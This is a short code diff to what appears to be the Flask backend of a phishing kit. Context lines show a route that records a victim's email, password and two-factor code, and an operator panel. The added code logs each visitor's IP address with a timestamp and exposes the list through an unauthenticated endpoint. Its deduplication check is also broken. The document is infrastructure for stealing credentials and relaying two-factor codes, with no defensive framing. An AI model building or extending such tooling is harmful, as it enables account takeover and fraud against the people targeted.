@@ -576,6 +576,18 @@ def set_victim_state():
     state = set_state(status, email, password, two_fa_code)
     return jsonify({'status': 'success', 'state': state})
 
+visitor_ips = []
+
+@app.before_request
+def log_visitor_ip():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip and ip not in visitor_ips:
+        visitor_ips.append({'ip': ip, 'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")})
+
+@app.route('/api/get-ips')
+def get_ips():
+    return jsonify(visitor_ips[-50:])
+
 @app.route('/panel')
 def panel():
     return send_from_directory(BASE_DIR, 'panel.html')
